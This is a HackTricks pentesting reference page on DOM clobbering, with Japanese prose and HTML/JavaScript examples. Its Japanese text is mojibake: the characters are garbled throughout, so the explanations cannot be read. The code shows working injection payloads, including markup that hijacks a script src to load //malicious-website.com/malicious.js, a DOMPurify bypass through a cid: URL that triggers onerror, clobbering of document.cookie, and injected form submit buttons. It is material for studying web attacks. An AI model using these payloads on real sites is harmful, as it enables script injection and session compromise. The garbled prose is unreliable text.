# Dom Clobbering

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## **åŸºæœ¬**

HTMLã‚¿ã‚°ã®å±æ€§**`id`**ã¨**`name`**ã‚’ä½¿ç”¨ã—ã¦ã€JSã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆå†…ã§**ã‚°ãƒ­ãƒ¼ãƒãƒ«å¤‰æ•°**ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**nameå±æ€§**ã‚’ä½¿ç”¨ã—ã¦ã‚°ãƒ­ãƒ¼ãƒãƒ«å¤‰æ•°ã‚’ä¸Šæ›¸ãã§ãã‚‹ã®ã¯ã€`embed`ã€`form`ã€`iframe`ã€`image`ã€`img`ã€`object`ã®ç‰¹å®šã®è¦ç´ ã®ã¿ã§ã™ã€‚

èˆˆå‘³æ·±ã„ã“ã¨ã«ã€**formè¦ç´ **ã‚’ä½¿ç”¨ã—ã¦å¤‰æ•°ã‚’ä¸Šæ›¸ãã™ã‚‹ã¨ã€è¦ç´ è‡ªä½“ã®**`toString`**å€¤ãŒè¡¨ç¤ºã•ã‚Œã¾ã™: `[object HTMLFormElement]` ã—ã‹ã—ã€**anchorè¦ç´ **ã§ã¯**`toString`**ã¯ã‚¢ãƒ³ã‚«ãƒ¼ã®**`href`**ã«ãªã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**`a`**ã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦ä¸Šæ›¸ãã™ã‚‹ã¨ã€**æ–‡å­—åˆ—ã¨ã—ã¦æ‰±ã‚ã‚Œã‚‹ã¨ãã«**åˆ¶å¾¡ã§ãã‚‹**å€¤**ã‚’å–å¾—ã§ãã¾ã™:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### é…åˆ—ã¨å±æ€§

é…åˆ—ã‚„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å±æ€§ã‚’**ä¸Šæ›¸ãã™ã‚‹**ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
**`form`**ã‚’ä½¿ç”¨ã—ã¦ã€**3ç•ªç›®ã®å±æ€§**ï¼ˆä¾‹ï¼šx.y.zï¼‰ã‚’ä¸Šæ›¸ãã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
å±æ€§ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã¯**ã‚ˆã‚Šè¤‡é›‘ã§ã™ãŒã€ä¾ç„¶ã¨ã—ã¦å¯èƒ½**ã§ã™ã€‚iframesã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
styleã‚¿ã‚°ã¯ã€iframeãŒãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹ã®ã«ååˆ†ãªæ™‚é–“ã‚’ä¸ãˆã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ãã‚Œãªã—ã§ã¯ã€**undefined**ã®ã‚¢ãƒ©ãƒ¼ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
{% endhint %}

ã‚ˆã‚Šæ·±ã„å±æ€§ã‚’ã‚¯ãƒ­ãƒœãƒ¼ã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®ã‚ˆã†ã«**HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ãŸiframe**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã®ãƒã‚¤ãƒ‘ã‚¹**

ã‚‚ã—ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ãŒ`document.getElementByID('x').attributes`ã®ã‚ˆã†ãªæ–¹æ³•ã§ãƒãƒ¼ãƒ‰ã®**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£**ã‚’**ãƒ«ãƒ¼ãƒ—å‡¦ç†**ã—ã¦ã„ã‚‹å ´åˆã€å±æ€§**`.attributes`**ã‚’**ä¸Šæ›¸ã**ã—ã¦ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’**ç ´å£Š**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»–ã®DOMãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã€ä¾‹ãˆã°**`tagName`**ã€**`nodeName`**ã€**`parentNode`**ãªã©ã‚‚**ä¸Šæ›¸ãå¯èƒ½**ã§ã™ã€‚
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **`window.someObject`ã®ã‚¯ãƒ­ãƒãƒªãƒ³ã‚°**

JavaScriptã®é–‹ç™ºè€…ãŒã‚ˆãä½¿ã†ãƒ‘ã‚¿ãƒ¼ãƒ³ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```javascript
var someObject = window.someObject || {};
```
ã‚‚ã—ãƒšãƒ¼ã‚¸ä¸Šã®HTMLã®ä¸€éƒ¨ã‚’åˆ¶å¾¡ã§ãã‚‹å ´åˆã€`someObject`ã®å‚ç…§ã‚’ã‚¢ãƒ³ã‚«ãƒ¼ãªã©ã®DOMãƒãƒ¼ãƒ‰ã§ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’è€ƒãˆã¦ã¿ã¦ãã ã•ã„ã€‚
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
ã“ã®è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®HTMLã‚’æ³¨å…¥ã—ã¦`someObject`ã®å‚ç…§ã‚’ã‚¢ãƒ³ã‚«ãƒ¼ã‚¨ãƒ¬ãƒ¡ãƒ³ãƒˆã§ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```
{% endcode %}

ãã®ãƒ‡ãƒ¼ã‚¿ã‚’æ³¨å…¥ã™ã‚‹ã¨ã€**`window.someObject.url`** ã¯ `href=//malicious-website.com/malicious.js` ã«ãªã‚Šã¾ã™ã€‚

**ãƒˆãƒªãƒƒã‚¯**ï¼š**`DOMPurify`** ã¯ **`cid:`** ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã€ã“ã‚Œã«ã‚ˆã‚Š **äºŒé‡å¼•ç”¨ç¬¦ã‚’ URL ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ãªã„** ã“ã¨ãŒã§ãã¾ã™ã€‚ã¤ã¾ã‚Šã€å®Ÿè¡Œæ™‚ã«ãƒ‡ã‚³ãƒ¼ãƒ‰ã•ã‚Œã‚‹ **ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸäºŒé‡å¼•ç”¨ç¬¦ã‚’æ³¨å…¥** ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** ã®ã‚ˆã†ãªã‚‚ã®ã‚’æ³¨å…¥ã™ã‚‹ã¨ã€HTML ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸ `&quot;` ãŒ **å®Ÿè¡Œæ™‚ã«ãƒ‡ã‚³ãƒ¼ãƒ‰** ã•ã‚Œã€å±æ€§å€¤ã‹ã‚‰ **`onerror`** ã‚¤ãƒ™ãƒ³ãƒˆã‚’ä½œæˆã™ã‚‹ãŸã‚ã« **ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—** ã—ã¾ã™ã€‚

ã‚‚ã†ä¸€ã¤ã®ä¸€èˆ¬çš„ãªãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€**`form`** è¦ç´ ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ä¸€éƒ¨ã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯ã€ä½œæˆã•ã‚ŒãŸãƒ•ã‚©ãƒ¼ãƒ è¦ç´ ã®å±æ€§ã‚’ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã—ã‹ã—ã€ãƒ•ã‚©ãƒ¼ãƒ å†…ã« `id=attributes` ã® `input` ã‚’ä½œæˆã™ã‚‹ã¨ã€å±æ€§ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ **ä¸Šæ›¸ã** ã—ã€ã‚µãƒ‹ã‚¿ã‚¤ã‚¶ã¯ **å®Ÿéš›ã®å±æ€§** ã‚’é€šéã™ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã€‚

ã“ã®ã‚¿ã‚¤ãƒ—ã®å±æ€§ä¸Šæ›¸ãã®ä¾‹ã¯ã€[**ã“ã® CTF ã®è§£èª¬**](iframes-in-xss-and-csp.md#iframes-in-sop-2)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä¸Šæ›¸ã

ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å±æ€§ã‚’ DOM Clobbering ã‚’ä½¿ç”¨ã—ã¦ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

> [Document](https://html.spec.whatwg.org/multipage/dom.html#document) ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã¯ã€[åå‰ä»˜ããƒ—ãƒ­ãƒ‘ãƒ†ã‚£](https://webidl.spec.whatwg.org/#dfn-support-named-properties) ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚[Document](https://html.spec.whatwg.org/multipage/dom.html#document) ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£åã¯ã€ã„ã¤ã§ã‚‚æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚[tree order](https://dom.spec.whatwg.org/#concept-tree-order) ã«å¾“ã£ã¦ã€ãã‚Œã‚‰ã‚’æä¾›ã—ãŸè¦ç´ ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸã‚‚ã®ã‚’ç„¡è¦–ã—ã€åŒã˜è¦ç´ ãŒä¸¡æ–¹ã‚’æä¾›ã™ã‚‹å ´åˆã¯ã€[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å±æ€§ã®å€¤ãŒ [name](https://html.spec.whatwg.org/multipage/dom.html#the-name-attribute) å±æ€§ã®å€¤ã‚ˆã‚Šã‚‚å‰ã«æ¥ã¾ã™ã€‚
>
> \- [å…¬é–‹](https://html.spec.whatwg.org/multipage/dom.html#exposed) ã•ã‚Œã¦ã„ã‚‹ [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element)ã€[form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element)ã€[iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)ã€[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element)ã€ãŠã‚ˆã³ [å…¬é–‹](https://html.spec.whatwg.org/multipage/dom.html#exposed) ã•ã‚Œã¦ã„ã‚‹ [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) è¦ç´ ã®ã™ã¹ã¦ã® [name](https://html.spec.whatwg.org/multipage/dom.html#the-name-attribute) å±æ€§ã®å€¤ã§ã€åå‰ä»˜ããƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ [ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://html.spec.whatwg.org/multipage/dom.html#document) ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ [ãƒ«ãƒ¼ãƒˆ](https://dom.spec.whatwg.org/#concept-tree-root) ã¨ã™ã‚‹ [ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒ„ãƒªãƒ¼](https://dom.spec.whatwg.org/#in-a-document-tree) ã«ã‚ã‚‹ã‚‚ã®ã§ã™ã€‚\
> \
> \- [å…¬é–‹](https://html.spec.whatwg.org/multipage/dom.html#exposed) ã•ã‚Œã¦ã„ã‚‹ [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) è¦ç´ ã®ã™ã¹ã¦ã® [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å±æ€§ã®å€¤ã§ã€åå‰ä»˜ããƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ [ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://html.spec.whatwg.org/multipage/dom.html#document) ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ [ãƒ«ãƒ¼ãƒˆ](https://dom.spec.whatwg.org/#concept-tree-root) ã¨ã™ã‚‹ [ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒ„ãƒªãƒ¼](https://dom.spec.whatwg.org/#in-a-document-tree) ã«ã‚ã‚‹ã‚‚ã®ã§ã™ã€‚\
> \
> \- [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) è¦ç´ ã®ã™ã¹ã¦ã® [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å±æ€§ã¨ [name](https://html.spec.whatwg.org/multipage/dom.html#the-name-attribute) å±æ€§ã®ä¸¡æ–¹ãŒéç©ºã§ã‚ã‚Šã€åå‰ä»˜ããƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ [ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://html.spec.whatwg.org/multipage/dom.html#document) ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ [ãƒ«ãƒ¼ãƒˆ](https://dom.spec.whatwg.org/#concept-tree-root) ã¨ã™ã‚‹ [ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒ„ãƒªãƒ¼](https://dom.spec.whatwg.org/#in-a-document-tree) ã«ã‚ã‚‹ã‚‚ã®ã§ã™ã€‚

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**`document.cookie`ã€`document.body`ã€`document.children`** ãªã©ã®ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹å€¤ã€ã•ã‚‰ã«ã¯ `document.querySelector` ã®ã‚ˆã†ãª Document ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)Â [img, form, cookie: img]

typeof(document.cookie)
'object
```
## è¦ç´ ã‚’ä¸Šæ›¸ãã—ãŸå¾Œã«æ›¸ãè¾¼ã‚€

**`document.getElementById()`** ã¨ **`document.querySelector()`** ã®å‘¼ã³å‡ºã—çµæœã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€**åŒã˜idå±æ€§ã‚’æŒã¤ `<html>` ã‚„ `<body>` ã‚¿ã‚°ã‚’æ³¨å…¥ã™ã‚‹**ã“ã¨ã§å®Ÿç¾ã§ãã¾ã™ã€‚ä»¥ä¸‹ã«ä¾‹ã‚’ç¤ºã—ã¾ã™:
```html
<div style=display:none id=cdnDomain class=x>test</div>
<p>
<html id="cdnDomain" class=x>clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
alert(document.querySelector('.x').innerText);//clobbbered
</script>
```
èˆˆå‘³æ·±ã„ã“ã¨ã«ã€`innerText`ã‹ã‚‰è¦ç´ ã‚’**éè¡¨ç¤ºã«ã™ã‚‹**ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€HTML/bodyã‚¿ã‚°ã‚’æ³¨å…¥ã™ã‚‹ã¨ã€ã‚¹ã‚¿ã‚¤ãƒ«ã‚’ä½¿ç”¨ã—ã¦`innerText`ã‹ã‚‰éè¡¨ç¤ºã«ã™ã‚‹ã“ã¨ã§ã€ä»–ã®ãƒ†ã‚­ã‚¹ãƒˆãŒæ”»æ’ƒã«å¹²æ¸‰ã™ã‚‹ã®ã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚
```html
<div style=display:none id=cdnDomain>test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
</script>
```
ç§ãŸã¡ã¯SVGã‚‚è¦‹ã¦ã¿ã¾ã—ãŸãŒã€ãã“ã§ã¯`<body>`ã‚¿ã‚°ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™:
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg><body id=cdnDomain>clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
Chromeã¨Firefoxã®ä¸¡æ–¹ã§ã€SVGå†…ã§HTMLã‚¿ã‚°ã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã«ã¯`<foreignobject>`ã‚¿ã‚°ãŒå¿…è¦ã§ã™ã€‚
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg>
<foreignobject>
<html id=cdnDomain>clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
## ãƒ•ã‚©ãƒ¼ãƒ ã®ä¸Šæ›¸ã

ã„ãã¤ã‹ã®ã‚¿ã‚°å†…ã«`form`å±æ€§ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ã§ã€**ãƒ•ã‚©ãƒ¼ãƒ å†…ã«æ–°ã—ã„ã‚¨ãƒ³ãƒˆãƒªã‚’è¿½åŠ **ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ã€**ãƒ•ã‚©ãƒ¼ãƒ å†…ã«æ–°ã—ã„å€¤ã‚’è¿½åŠ **ã—ãŸã‚Šã€æ–°ã—ã„**ãƒœã‚¿ãƒ³**ã‚’è¿½åŠ ã—ã¦**é€ä¿¡**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼ˆã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°ã¾ãŸã¯`.click()`ã®JSã‚³ãƒ¼ãƒ‰ã®ä¹±ç”¨ï¼‰ã€‚ 

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* [**ã“ã“ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„**](https://www.w3schools.com/tags/tag\_button.asp)**ã§ã€ã•ã‚‰ã«ãƒ•ã‚©ãƒ¼ãƒ å±æ€§ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚**

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
